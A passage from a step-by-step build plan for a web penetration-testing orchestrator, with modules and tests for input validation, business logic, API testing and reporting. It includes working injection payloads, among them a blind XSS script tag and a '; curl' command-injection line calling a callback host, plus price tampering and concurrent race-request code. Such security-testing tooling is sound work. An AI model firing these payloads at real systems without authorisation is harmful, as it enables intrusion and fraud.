                "--output-dir=/tmp/sqlmap_output", "--smart"]

        if method == "POST":
            args.extend(["--method=POST", f"--data={param}=test"])

        result = self._cmd.run("sqlmap", args, timeout=300)
        if result.returncode == 0:
            self.evidence.log_tool_output("input_validation", "sqlmap", result.stdout)

    async def _xss_testing(self):
        self.logger.info("Starting XSS testing")
        parameters = self.state.get("parameters") or []

        for param in parameters:
            url = param.get("url", "")
            name = param.get("name", "")
            method = param.get("method", "GET")

            for payload in self.XSS_PAYLOADS:
                try:
                    resp = self._inject_param(url, name, payload, method)
                    if payload in resp.text:
                        self.evidence.log_potential_exploit("input_validation", {
                            "type": "xss_reflected",
                            "url": url, "parameter": name,
                            "payload": payload,
                            "severity": "high",
                            "context": self._detect_xss_context(resp.text, payload),
                        })
                        self.state.enrich("potential_vulnerabilities", [{
                            "type": "xss_reflected",
                            "url": url,
                            "severity": "high",
                            "description": f"Reflected XSS in param '{name}' with payload: {payload}",
                        }])
                        break  # Found one, move to next param
                except Exception:
                    continue

            # Blind XSS via callback server
            callback_url, token = self.callback.generate_callback(
                module="input_validation",
                parameter=name,
                payload="blind_xss",
            )
            blind_payload = f'"><script src="{callback_url}"></script>'
            try:
                self._inject_param(url, name, blind_payload, method)
            except Exception:
                pass

    def _detect_xss_context(self, body: str, payload: str) -> str:
        idx = body.find(payload)
        if idx == -1:
            return "unknown"
        context = body[max(0, idx - 50):idx + len(payload) + 50]
        if re.search(r'<script[^>]*>', context[:50], re.I):
            return "script_block"
        if re.search(r'<[^>]+$', context[:50]):
            return "html_attribute"
        return "html_body"

    async def _command_injection(self):
        self.logger.info("Starting command injection testing")
        parameters = self.state.get("parameters") or []

        for param in parameters:
            url = param.get("url", "")
            name = param.get("name", "")
            method = param.get("method", "GET")

            # Direct output detection
            for payload in self.CMDI_PAYLOADS:
                try:
                    resp = self._inject_param(url, name, payload, method)
                    for sig in self.CMDI_SIGNATURES:
                        if re.search(sig, resp.text):
                            self.evidence.log_confirmed_exploit("input_validation", {
                                "type": "command_injection",
                                "url": url, "parameter": name,
                                "payload": payload,
                                "severity": "critical",
                                "output_snippet": resp.text[:500],
                            })
                            self.state.enrich("confirmed_vulnerabilities", [{
                                "type": "command_injection",
                                "url": url,
                                "severity": "critical",
                                "description": f"Command injection in param '{name}'",
                                "reproduction_steps": f"1. Send {method} to {url}\n2. Set {name}={payload}",
                                "impact": "Remote code execution on the server",
                                "mitigation": "Never pass user input to shell commands. Use parameterized APIs.",
                            }])
                            break
                except Exception:
                    continue

            # Time-based detection
            for payload in self.CMDI_TIME_PAYLOADS:
                try:
                    start = time.monotonic()
                    self._inject_param(url, name, payload, method)
                    elapsed = time.monotonic() - start
                    if elapsed >= 2.5:
                        self.evidence.log_potential_exploit("input_validation", {
                            "type": "command_injection_blind",
                            "url": url, "parameter": name,
                            "payload": payload, "delay": elapsed,
                            "severity": "critical",
                        })
                        self.state.enrich("potential_vulnerabilities", [{
                            "type": "command_injection_blind",
                            "url": url,
                            "severity": "critical",
                            "description": f"Blind command injection in '{name}' (delay: {elapsed:.1f}s)",
                        }])
                        break
                except Exception:
                    continue

            # DNS-based blind detection via callback
            callback_url, token = self.callback.generate_callback(
                module="input_validation", parameter=name, payload="cmdi_blind",
            )
            dns_payload = f"; curl {callback_url}"
            try:
                self._inject_param(url, name, dns_payload, method)
            except Exception:
                pass

        # Commix handoff
        if self._cmd.is_tool_available("commix"):
            for param in parameters[:5]:
                url = param.get("url", "")
                name = param.get("name", "")
                result = self._cmd.run(
                    "commix",
                    ["--url", f"{url}?{name}=test", "--batch", "--level=2"],
                    timeout=120,
                )
                if result.returncode == 0:
                    self.evidence.log_tool_output("input_validation", "commix", result.stdout)

    def _inject_param(self, url: str, param_name: str, payload: str, method: str = "GET"):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        if method.upper() == "GET":
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            params[param_name] = payload
            new_query = urlencode(params, doseq=True)
            test_url = urlunparse((parsed.scheme, parsed.netloc, parsed.path,
                                   parsed.params, new_query, parsed.fragment))
            return client.get(test_url)
        else:
            return client.post(url, data={param_name: payload})
```

**Step 4: Run tests**

```bash
pytest tests/test_input_validation.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/modules/input_validation.py tests/test_input_validation.py
git commit -m "feat: implement InputValidationModule with SQLi, XSS, and command injection testing"
```

---

## Task 20: Business Logic Module

**Files:**
- Create: `wstg_orchestrator/modules/business_logic.py`
- Create: `tests/test_business_logic.py`

**Step 1: Write failing tests**

```python
# tests/test_business_logic.py
import pytest
from unittest.mock import MagicMock
from wstg_orchestrator.modules.business_logic import BusinessLogicModule


@pytest.fixture
def bl_module():
    state = MagicMock()
    state.get.side_effect = lambda key: {
        "live_hosts": ["https://app.example.com"],
        "endpoints": [
            "https://app.example.com/checkout",
            "https://app.example.com/api/order",
        ],
        "parameters": [
            {"url": "https://app.example.com/api/order", "name": "price", "value": "99.99", "method": "POST"},
            {"url": "https://app.example.com/api/order", "name": "quantity", "value": "1", "method": "POST"},
        ],
        "forms": [],
    }.get(key, [])
    state.is_phase_complete.return_value = False
    state.is_subcategory_complete.return_value = False
    config = MagicMock()
    config.base_domain = "example.com"
    config.get_tool_config.return_value = {}
    config.custom_headers = {}
    scope = MagicMock()
    scope.is_in_scope.return_value = True
    scope.is_attack_vector_allowed.return_value = True
    limiter = MagicMock()
    evidence = MagicMock()
    evidence.log_parsed.return_value = "/tmp/test"
    evidence.log_potential_exploit.return_value = "/tmp/test"
    callback = MagicMock()
    return BusinessLogicModule(state, config, scope, limiter, evidence, callback)


def test_phase_name(bl_module):
    assert bl_module.PHASE_NAME == "business_logic"


def test_subcategories(bl_module):
    assert "workflow_bypass" in bl_module.SUBCATEGORIES
    assert "parameter_tampering" in bl_module.SUBCATEGORIES
    assert "race_conditions" in bl_module.SUBCATEGORIES


def test_tamper_values(bl_module):
    values = bl_module.PRICE_TAMPER_VALUES
    assert 0 in values
    assert -1 in values
    assert 0.01 in values


def test_race_skipped_when_dos_blocked():
    state = MagicMock()
    state.get.return_value = []
    state.is_phase_complete.return_value = False
    state.is_subcategory_complete.return_value = False
    config = MagicMock()
    config.base_domain = "example.com"
    config.get_tool_config.return_value = {}
    scope = MagicMock()
    scope.is_attack_vector_allowed.side_effect = lambda v: v != "dos"
    limiter = MagicMock()
    evidence = MagicMock()
    callback = MagicMock()
    mod = BusinessLogicModule(state, config, scope, limiter, evidence, callback)
    assert mod.is_attack_allowed("dos") is False
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_business_logic.py -v
```

**Step 3: Implement BusinessLogicModule**

```python
# wstg_orchestrator/modules/business_logic.py
import concurrent.futures
import time

from wstg_orchestrator.modules.base_module import BaseModule
from wstg_orchestrator.utils.parser_utils import diff_responses


class BusinessLogicModule(BaseModule):
    PHASE_NAME = "business_logic"
    SUBCATEGORIES = ["workflow_bypass", "parameter_tampering", "race_conditions"]
    EVIDENCE_SUBDIRS = [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ]

    PRICE_TAMPER_VALUES = [0, -1, 0.01, 0.001, 99999999, -99.99]
    QUANTITY_TAMPER_VALUES = [0, -1, 99999999, 0.5]

    async def execute(self):
        if not self.should_skip_subcategory("workflow_bypass"):
            await self._workflow_bypass()
            self.mark_subcategory_complete("workflow_bypass")

        if not self.should_skip_subcategory("parameter_tampering"):
            await self._parameter_tampering()
            self.mark_subcategory_complete("parameter_tampering")

        if not self.should_skip_subcategory("race_conditions"):
            if self.is_attack_allowed("dos"):
                await self._race_conditions()
            else:
                self.logger.info("DoS-style testing blocked by scope, skipping race conditions")
            self.mark_subcategory_complete("race_conditions")

    async def _workflow_bypass(self):
        self.logger.info("Starting workflow bypass testing")
        endpoints = self.state.get("endpoints") or []

        # Identify multi-step workflows
        checkout_patterns = [
            "/checkout", "/payment", "/confirm", "/review",
            "/step2", "/step3", "/finalize", "/complete",
        ]

        workflow_endpoints = [
            ep for ep in endpoints
            if any(p in ep.lower() for p in checkout_patterns)
        ]

        # Try accessing later steps directly without completing earlier ones
        for endpoint in workflow_endpoints:
            try:
                resp = self._http_get(endpoint)
                if resp.status_code == 200:
                    body_lower = resp.text.lower()
                    # Check if we got the actual page instead of a redirect
                    if not any(err in body_lower for err in ["redirect", "login", "unauthorized", "forbidden"]):
                        self.evidence.log_potential_exploit("business_logic", {
                            "type": "workflow_bypass",
                            "url": endpoint,
                            "severity": "medium",
                            "description": f"Direct access to workflow step without completing prerequisites",
                        })
                        self.state.enrich("potential_vulnerabilities", [{
                            "type": "workflow_bypass",
                            "url": endpoint,
                            "severity": "medium",
                            "description": "Workflow step accessible without completing prior steps",
                        }])
            except Exception:
                continue

    async def _parameter_tampering(self):
        self.logger.info("Starting parameter tampering")
        parameters = self.state.get("parameters") or []

        # Price tampering
        price_params = [p for p in parameters if p.get("name", "").lower() in
                        ["price", "amount", "total", "cost", "fee", "charge", "subtotal"]]

        for param in price_params:
            url = param["url"]
            name = param["name"]
            for tamper_value in self.PRICE_TAMPER_VALUES:
                try:
                    resp = self._http_post(url, data={name: str(tamper_value)})
                    if resp.status_code == 200:
                        self.evidence.log_potential_exploit("business_logic", {
                            "type": "price_tampering",
                            "url": url, "parameter": name,
                            "original_value": param.get("value"),
                            "tampered_value": tamper_value,
                            "severity": "high",
                            "description": f"Price parameter accepted tampered value: {tamper_value}",
                        })
                        self.state.enrich("potential_vulnerabilities", [{
                            "type": "price_tampering",
                            "url": url,
                            "severity": "high",
                            "description": f"Price param '{name}' accepted value: {tamper_value}",
                        }])
                except Exception:
                    continue

        # Quantity tampering
        qty_params = [p for p in parameters if p.get("name", "").lower() in
                      ["quantity", "qty", "count", "num", "amount"]]

        for param in qty_params:
            url = param["url"]
            name = param["name"]
            for tamper_value in self.QUANTITY_TAMPER_VALUES:
                try:
                    resp = self._http_post(url, data={name: str(tamper_value)})
                    if resp.status_code == 200:
                        self.evidence.log_potential_exploit("business_logic", {
                            "type": "quantity_tampering",
                            "url": url, "parameter": name,
                            "tampered_value": tamper_value,
                            "severity": "medium",
                        })
                except Exception:
                    continue

    async def _race_conditions(self):
        self.logger.info("Starting race condition testing")
        endpoints = self.state.get("endpoints") or []

        # Target endpoints that modify state
        state_changing = [
            ep for ep in endpoints
            if any(p in ep.lower() for p in [
                "/apply", "/redeem", "/coupon", "/transfer",
                "/withdraw", "/buy", "/order", "/vote",
            ])
        ]

        for endpoint in state_changing[:3]:  # Limit to 3
            try:
                responses = self._send_concurrent(endpoint, count=10)
                success_count = sum(1 for r in responses if r and r.status_code == 200)
                unique_bodies = len(set(r.text[:200] for r in responses if r))

                if success_count > 1 and unique_bodies > 1:
                    self.evidence.log_potential_exploit("business_logic", {
                        "type": "race_condition",
                        "url": endpoint,
                        "concurrent_successes": success_count,
                        "unique_responses": unique_bodies,
                        "severity": "high",
                        "description": "Inconsistent state under concurrent requests",
                    })
                    self.state.enrich("potential_vulnerabilities", [{
                        "type": "race_condition",
                        "url": endpoint,
                        "severity": "high",
                        "description": f"Race condition: {success_count}/10 concurrent requests succeeded with {unique_bodies} unique responses",
                    }])
            except Exception as e:
                self.logger.debug(f"Race condition test failed for {endpoint}: {e}")

    def _send_concurrent(self, url: str, count: int = 10):
        import requests as req_lib
        headers = self.config.custom_headers if hasattr(self.config, 'custom_headers') else {}

        def send_one(_):
            try:
                return req_lib.post(url, headers=headers, timeout=10)
            except Exception:
                return None

        with concurrent.futures.ThreadPoolExecutor(max_workers=count) as executor:
            futures = [executor.submit(send_one, i) for i in range(count)]
            return [f.result() for f in concurrent.futures.as_completed(futures)]

    def _http_get(self, url: str):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        return client.get(url)

    def _http_post(self, url: str, data: dict | None = None):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        return client.post(url, data=data)
```

**Step 4: Run tests**

```bash
pytest tests/test_business_logic.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/modules/business_logic.py tests/test_business_logic.py
git commit -m "feat: implement BusinessLogicModule with workflow bypass, price tamper, and race conditions"
```

---

## Task 21: API Testing Module

**Files:**
- Create: `wstg_orchestrator/modules/api_testing.py`
- Create: `tests/test_api_testing.py`

**Step 1: Write failing tests**

```python
# tests/test_api_testing.py
import pytest
from unittest.mock import MagicMock
from wstg_orchestrator.modules.api_testing import ApiTestingModule


@pytest.fixture
def api_module():
    state = MagicMock()
    state.get.side_effect = lambda key: {
        "live_hosts": ["https://app.example.com"],
        "endpoints": [
            "https://app.example.com/api/v1/users",
            "https://app.example.com/graphql",
        ],
        "api_endpoints": [],
        "parameters": [],
    }.get(key, [])
    state.is_phase_complete.return_value = False
    state.is_subcategory_complete.return_value = False
    config = MagicMock()
    config.base_domain = "example.com"
    config.get_tool_config.return_value = {}
    config.custom_headers = {}
    scope = MagicMock()
    scope.is_in_scope.return_value = True
    limiter = MagicMock()
    evidence = MagicMock()
    evidence.log_parsed.return_value = "/tmp/test"
    evidence.log_tool_output.return_value = "/tmp/test"
    evidence.log_potential_exploit.return_value = "/tmp/test"
    evidence.log_confirmed_exploit.return_value = "/tmp/test"
    callback = MagicMock()
    return ApiTestingModule(state, config, scope, limiter, evidence, callback)


def test_phase_name(api_module):
    assert api_module.PHASE_NAME == "api_testing"


def test_subcategories(api_module):
    assert "api_discovery" in api_module.SUBCATEGORIES
    assert "bola_testing" in api_module.SUBCATEGORIES
    assert "graphql_testing" in api_module.SUBCATEGORIES


def test_swagger_paths(api_module):
    assert len(api_module.SWAGGER_PATHS) > 0
    assert "/swagger.json" in api_module.SWAGGER_PATHS or "/openapi.json" in api_module.SWAGGER_PATHS


def test_graphql_introspection_query(api_module):
    query = api_module.INTROSPECTION_QUERY
    assert "__schema" in query
    assert "queryType" in query
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_api_testing.py -v
```

**Step 3: Implement ApiTestingModule**

```python
# wstg_orchestrator/modules/api_testing.py
import json
import re

from wstg_orchestrator.modules.base_module import BaseModule
from wstg_orchestrator.utils.command_runner import CommandRunner
from wstg_orchestrator.utils.parser_utils import diff_responses


class ApiTestingModule(BaseModule):
    PHASE_NAME = "api_testing"
    SUBCATEGORIES = ["api_discovery", "bola_testing", "graphql_testing"]
    EVIDENCE_SUBDIRS = [
        "tool_output", "raw_requests", "raw_responses", "parsed",
        "evidence", "potential_exploits", "confirmed_exploits", "screenshots",
    ]

    SWAGGER_PATHS = [
        "/swagger.json", "/openapi.json", "/api-docs",
        "/swagger/v1/swagger.json", "/v1/swagger.json",
        "/v2/swagger.json", "/api/swagger.json",
        "/swagger-ui.html", "/swagger-resources",
        "/openapi/v3/api-docs", "/api/v1/openapi.json",
        "/docs", "/redoc", "/.well-known/openapi.json",
    ]

    API_VERSION_PATHS = [
        "/api/v{n}/", "/v{n}/api/", "/api/{n}/",
    ]

    INTROSPECTION_QUERY = """
    query IntrospectionQuery {
        __schema {
            queryType { name }
            mutationType { name }
            types {
                name
                kind
                fields {
                    name
                    type { name kind }
                    args { name type { name } }
                }
            }
        }
    }
    """

    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self._cmd = CommandRunner(
            tool_configs={
                name: self.config.get_tool_config(name)
                for name in ["kiterunner"]
            }
        )

    async def execute(self):
        if not self.should_skip_subcategory("api_discovery"):
            await self._api_discovery()
            self.mark_subcategory_complete("api_discovery")

        if not self.should_skip_subcategory("bola_testing"):
            await self._bola_testing()
            self.mark_subcategory_complete("bola_testing")

        if not self.should_skip_subcategory("graphql_testing"):
            await self._graphql_testing()
            self.mark_subcategory_complete("graphql_testing")

    async def _api_discovery(self):
        self.logger.info("Starting API discovery")
        live_hosts = self.state.get("live_hosts") or []
        found_apis = []

        for host_url in live_hosts:
            base = host_url.rstrip("/")

            # Swagger/OpenAPI detection
            for path in self.SWAGGER_PATHS:
                try:
                    resp = self._http_get(f"{base}{path}")
                    if resp.status_code == 200:
                        content_type = resp.headers.get("Content-Type", "")
                        if "json" in content_type or resp.text.strip().startswith("{"):
                            try:
                                spec = json.loads(resp.text)
                                if "swagger" in spec or "openapi" in spec or "paths" in spec:
                                    self.logger.info(f"Found OpenAPI spec at {base}{path}")
                                    self.evidence.log_tool_output("api_testing", "swagger_spec", resp.text)
                                    # Extract endpoints from spec
                                    paths = spec.get("paths", {})
                                    for api_path, methods in paths.items():
                                        full_url = f"{base}{api_path}"
                                        found_apis.append(full_url)
                                        for method_name in methods:
                                            if method_name.upper() in ["GET", "POST", "PUT", "DELETE", "PATCH"]:
                                                self.evidence.log_parsed("api_testing", "api_endpoint", {
                                                    "url": full_url, "method": method_name.upper(),
                                                })
                            except json.JSONDecodeError:
                                pass
                except Exception:
                    continue

            # API version rollback
            for version_template in self.API_VERSION_PATHS:
                for n in range(1, 5):
                    version_path = version_template.replace("{n}", str(n))
                    try:
                        resp = self._http_get(f"{base}{version_path}")
                        if resp.status_code in [200, 301, 302]:
                            found_apis.append(f"{base}{version_path}")
                    except Exception:
                        continue

        # Kiterunner
        if self._cmd.is_tool_available("kiterunner"):
            for host_url in live_hosts[:3]:
                result = self._cmd.run(
                    "kiterunner", ["scan", host_url, "--fail-status-codes", "404,400"],
                    timeout=300,
                )
                if result.returncode == 0:
                    self.evidence.log_tool_output("api_testing", "kiterunner", result.stdout)
                    for line in result.stdout.splitlines():
                        url_match = re.search(r'(https?://\S+)', line)
                        if url_match:
                            found_apis.append(url_match.group(1))

        if found_apis:
            self.state.enrich("api_endpoints", list(set(found_apis)))
            self.state.enrich("endpoints", list(set(found_apis)))
            self.evidence.log_parsed("api_testing", "discovered_apis", list(set(found_apis)))

    async def _bola_testing(self):
        self.logger.info("Starting BOLA testing")
        api_endpoints = self.state.get("api_endpoints") or []
        idor_candidates = self.state.get("potential_idor_candidates") or []

        # Find API endpoints with IDs
        id_pattern = re.compile(r'/(\d+)(?:/|$|\?)')
        for endpoint in api_endpoints:
            match = id_pattern.search(endpoint)
            if match:
                original_id = match.group(1)
                for test_id in [str(int(original_id) + 1), str(int(original_id) - 1), "1"]:
                    test_url = endpoint.replace(f"/{original_id}", f"/{test_id}")
                    try:
                        original_resp = self._http_get(endpoint)
                        test_resp = self._http_get(test_url)

                        if test_resp.status_code == 200 and original_resp.status_code == 200:
                            diff = diff_responses(original_resp.text, test_resp.text)
                            if not diff["identical"]:
                                self.evidence.log_potential_exploit("api_testing", {
                                    "type": "bola",
                                    "original_url": endpoint,
                                    "test_url": test_url,
                                    "severity": "high",
                                    "description": "Potential BOLA: API returned different data for different IDs",
                                })
                                self.state.enrich("potential_vulnerabilities", [{
                                    "type": "bola",
                                    "url": test_url,
                                    "severity": "high",
                                    "description": f"BOLA: ID swap from {original_id} to {test_id} returned data",
                                }])
                    except Exception:
                        continue

    async def _graphql_testing(self):
        self.logger.info("Starting GraphQL testing")
        live_hosts = self.state.get("live_hosts") or []
        endpoints = self.state.get("endpoints") or []

        graphql_endpoints = [
            ep for ep in endpoints + live_hosts
            if "graphql" in ep.lower()
        ]

        # Also probe common GraphQL paths
        for host_url in live_hosts:
            base = host_url.rstrip("/")
            for path in ["/graphql", "/graphiql", "/gql", "/api/graphql"]:
                try:
                    resp = self._http_post(f"{base}{path}", json_data={"query": "{ __typename }"})
                    if resp.status_code == 200 and "__typename" in resp.text:
                        graphql_endpoints.append(f"{base}{path}")
                except Exception:
                    continue

        graphql_endpoints = list(set(graphql_endpoints))

        for endpoint in graphql_endpoints:
            # Introspection query
            try:
                resp = self._http_post(endpoint, json_data={"query": self.INTROSPECTION_QUERY})
                if resp.status_code == 200 and "__schema" in resp.text:
                    self.logger.info(f"GraphQL introspection enabled at {endpoint}")
                    self.evidence.log_tool_output("api_testing", "graphql_schema", resp.text)

                    try:
                        schema = json.loads(resp.text)
                        types = schema.get("data", {}).get("__schema", {}).get("types", [])
                        self.evidence.log_parsed("api_testing", "graphql_types", {
                            "endpoint": endpoint,
                            "type_count": len(types),
                            "types": [t.get("name") for t in types if not t.get("name", "").startswith("__")],
                        })
                    except json.JSONDecodeError:
                        pass

                    self.state.enrich("potential_vulnerabilities", [{
                        "type": "graphql_introspection",
                        "url": endpoint,
                        "severity": "low",
                        "description": "GraphQL introspection enabled — full schema is queryable",
                    }])

                    # Depth abuse test
                    depth_query = self._build_depth_query(5)
                    try:
                        depth_resp = self._http_post(endpoint, json_data={"query": depth_query})
                        if depth_resp.status_code == 200 and "errors" not in depth_resp.text.lower():
                            self.evidence.log_potential_exploit("api_testing", {
                                "type": "graphql_depth_abuse",
                                "url": endpoint,
                                "depth": 5,
                                "severity": "medium",
                                "description": "GraphQL allows deeply nested queries (no depth limit)",
                            })
                    except Exception:
                        pass
            except Exception as e:
                self.logger.debug(f"GraphQL test failed for {endpoint}: {e}")

    def _build_depth_query(self, depth: int) -> str:
        query = "{ __typename }"
        for i in range(depth):
            query = f"{{ __schema {{ types {{ fields {{ type {{ ofType {query} }} }} }} }} }}"
        return query

    def _http_get(self, url: str, extra_headers: dict | None = None):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        return client.get(url, headers=extra_headers)

    def _http_post(self, url: str, data: dict | None = None, json_data: dict | None = None):
        from wstg_orchestrator.utils.http_utils import HttpClient
        client = HttpClient(
            scope_checker=self.scope,
            rate_limiter=self.rate_limiter,
            custom_headers=self.config.custom_headers if hasattr(self.config, 'custom_headers') else {},
        )
        return client.post(url, data=data, json_data=json_data)
```

**Step 4: Run tests**

```bash
pytest tests/test_api_testing.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/modules/api_testing.py tests/test_api_testing.py
git commit -m "feat: implement ApiTestingModule with Swagger detection, BOLA, and GraphQL introspection"
```

---

## Task 22: Reporting Engine

**Files:**
- Create: `wstg_orchestrator/reporting.py`
- Create: `tests/test_reporting.py`

**Step 1: Write failing tests**

```python
# tests/test_reporting.py
import json
import os
import tempfile
import pytest
from wstg_orchestrator.reporting import ReportGenerator


@pytest.fixture
def sample_state():
    return {
        "target_domain": "example.com",
        "company_name": "ExCorp",
        "scan_id": "test-123",
        "scan_start": "2026-02-12T00:00:00Z",
        "discovered_subdomains": ["a.example.com", "b.example.com"],
        "live_hosts": ["https://a.example.com"],
        "open_ports": [{"host": "a.example.com", "port": 443}],
        "technologies": ["nginx", "React"],
        "endpoints": ["https://a.example.com/api/users"],
        "parameters": [{"url": "https://a.example.com/search", "name": "q", "method": "GET"}],
        "potential_vulnerabilities": [
            {"type": "xss", "url": "https://a.example.com/search?q=test", "severity": "high",
             "description": "Reflected XSS", "evidence_file": "/evidence/xss.json"},
        ],
        "confirmed_vulnerabilities": [
            {"type": "sqli", "url": "https://a.example.com/api/users?id=1", "severity": "critical",
             "description": "SQL Injection", "evidence_file": "/evidence/sqli.json",
             "reproduction_steps": "1. Send payload ' OR 1=1-- to id param",
             "impact": "Full database access", "mitigation": "Use parameterized queries"},
        ],
        "evidence_index": [],
    }


@pytest.fixture
def reports_dir():
    with tempfile.TemporaryDirectory() as d:
        yield d


def test_generate_attack_surface(sample_state, reports_dir):
    gen = ReportGenerator(sample_state, reports_dir)
    gen.generate_attack_surface()
    path = os.path.join(reports_dir, "attack_surface.json")
    assert os.path.exists(path)
    with open(path) as f:
        data = json.load(f)
    assert "a.example.com" in data["subdomains"]


def test_generate_findings(sample_state, reports_dir):
    gen = ReportGenerator(sample_state, reports_dir)
    gen.generate_potential_findings()
    gen.generate_confirmed_findings()
    assert os.path.exists(os.path.join(reports_dir, "potential_findings.json"))
    assert os.path.exists(os.path.join(reports_dir, "confirmed_findings.json"))


def test_generate_executive_summary(sample_state, reports_dir):
    gen = ReportGenerator(sample_state, reports_dir)
    gen.generate_executive_summary()
    path = os.path.join(reports_dir, "executive_summary.txt")
    assert os.path.exists(path)
    with open(path) as f:
        content = f.read()
    assert "ExCorp" in content
    assert "CRITICAL" in content.upper() or "SQL Injection" in content
```

**Step 2: Run tests to verify they fail**

```bash
pytest tests/test_reporting.py -v
```

**Step 3: Implement ReportGenerator**

```python
# wstg_orchestrator/reporting.py
import json
import os
from datetime import datetime, timezone


SEVERITY_ORDER = {"critical": 0, "high": 1, "medium": 2, "low": 3, "info": 4}


class ReportGenerator:
    def __init__(self, state: dict, reports_dir: str):
        self._state = state
        self._dir = reports_dir
        os.makedirs(self._dir, exist_ok=True)

    def _write_json(self, filename: str, data: dict | list):
        path = os.path.join(self._dir, filename)
        with open(path, "w") as f:
            json.dump(data, f, indent=2, default=str)
        return path

    def generate_attack_surface(self) -> str:
        data = {
            "target_domain": self._state.get("target_domain", ""),
            "scan_id": self._state.get("scan_id", ""),
            "subdomains": self._state.get("discovered_subdomains", []),
            "live_hosts": self._state.get("live_hosts", []),
            "open_ports": self._state.get("open_ports", []),
            "technologies": self._state.get("technologies", []),
            "frameworks": self._state.get("frameworks", []),
            "endpoints": self._state.get("endpoints", []),
            "parameters": self._state.get("parameters", []),
            "api_endpoints": self._state.get("api_endpoints", []),
            "cloud_assets": self._state.get("cloud_assets", []),
        }
        return self._write_json("attack_surface.json", data)

    def generate_potential_findings(self) -> str:
        findings = sorted(
            self._state.get("potential_vulnerabilities", []),
            key=lambda f: SEVERITY_ORDER.get(f.get("severity", "info"), 4),
        )
        return self._write_json("potential_findings.json", findings)

    def generate_confirmed_findings(self) -> str:
        findings = sorted(
            self._state.get("confirmed_vulnerabilities", []),
            key=lambda f: SEVERITY_ORDER.get(f.get("severity", "info"), 4),
        )
        return self._write_json("confirmed_findings.json", findings)

    def generate_evidence_index(self) -> str:
        return self._write_json("evidence_index.json", self._state.get("evidence_index", []))

    def generate_executive_summary(self) -> str:
        potential = self._state.get("potential_vulnerabilities", [])
        confirmed = self._state.get("confirmed_vulnerabilities", [])
        all_findings = confirmed + potential

        severity_counts = {}
        for f in all_findings:
            sev = f.get("severity", "info").upper()
            severity_counts[sev] = severity_counts.get(sev, 0) + 1

        lines = [
            "=" * 70,
            "EXECUTIVE SUMMARY - SECURITY ASSESSMENT REPORT",
            "=" * 70,
            "",
            f"Company: {self._state.get('company_name', 'N/A')}",
            f"Target: {self._state.get('target_domain', 'N/A')}",
            f"Scan ID: {self._state.get('scan_id', 'N/A')}",
            f"Scan Start: {self._state.get('scan_start', 'N/A')}",
            f"Report Generated: {datetime.now(timezone.utc).isoformat()}",
            "",
            "-" * 70,
            "SCOPE SUMMARY",
            "-" * 70,
            f"Subdomains discovered: {len(self._state.get('discovered_subdomains', []))}",
            f"Live hosts: {len(self._state.get('live_hosts', []))}",
            f"Endpoints: {len(self._state.get('endpoints', []))}",
            f"Parameters: {len(self._state.get('parameters', []))}",
            "",
            "-" * 70,
            "FINDINGS SUMMARY",
            "-" * 70,
            f"Confirmed vulnerabilities: {len(confirmed)}",
            f"Potential vulnerabilities: {len(potential)}",
            "",
        ]

        for sev in ["CRITICAL", "HIGH", "MEDIUM", "LOW", "INFO"]:
            count = severity_counts.get(sev, 0)
            if count > 0:
                lines.append(f"  {sev}: {count}")

        lines.extend(["", "-" * 70, "CONFIRMED FINDINGS (sorted by severity)", "-" * 70, ""])

        sorted_confirmed = sorted(
            confirmed,
            key=lambda f: SEVERITY_ORDER.get(f.get("severity", "info"), 4),
        )

        for i, finding in enumerate(sorted_confirmed, 1):
            lines.extend([
                f"[{i}] {finding.get('type', 'Unknown').upper()} — {finding.get('severity', 'info').upper()}",
                f"    URL: {finding.get('url', 'N/A')}",
                f"    Description: {finding.get('description', 'N/A')}",
                f"    Reproduction: {finding.get('reproduction_steps', 'N/A')}",
                f"    Impact: {finding.get('impact', 'N/A')}",
                f"    Mitigation: {finding.get('mitigation', 'N/A')}",
                f"    Evidence: {finding.get('evidence_file', 'N/A')}",
                "",
            ])

        if potential:
            lines.extend(["-" * 70, "POTENTIAL FINDINGS (require manual verification)", "-" * 70, ""])
            for i, finding in enumerate(potential, 1):
                lines.extend([
                    f"[{i}] {finding.get('type', 'Unknown').upper()} — {finding.get('severity', 'info').upper()}",
                    f"    URL: {finding.get('url', 'N/A')}",
                    f"    Description: {finding.get('description', 'N/A')}",
                    f"    Evidence: {finding.get('evidence_file', 'N/A')}",
                    "",
                ])

        lines.extend(["=" * 70, "END OF REPORT", "=" * 70])

        path = os.path.join(self._dir, "executive_summary.txt")
        with open(path, "w") as f:
            f.write("\n".join(lines))
        return path

    def generate_all(self):
        self.generate_attack_surface()
        self.generate_potential_findings()
        self.generate_confirmed_findings()
        self.generate_evidence_index()
        self.generate_executive_summary()
```

**Step 4: Run tests**

```bash
pytest tests/test_reporting.py -v
```

Expected: All PASS

**Step 5: Commit**

```bash
git add wstg_orchestrator/reporting.py tests/test_reporting.py
git commit -m "feat: implement ReportGenerator with JSON reports and executive summary"
```

---

## Task 23: Wire Everything Together in Main

**Files:**
- Modify: `wstg_orchestrator/main.py`

**Step 1: Update main.py to register all modules and trigger reports**

Add module imports and registration in the `main()` function. Add report generation after scan completion in `Orchestrator.run()`.

**Step 2: Run full test suite**

```bash
pytest tests/ -v
```

Expected: All PASS

**Step 3: Commit**

```bash
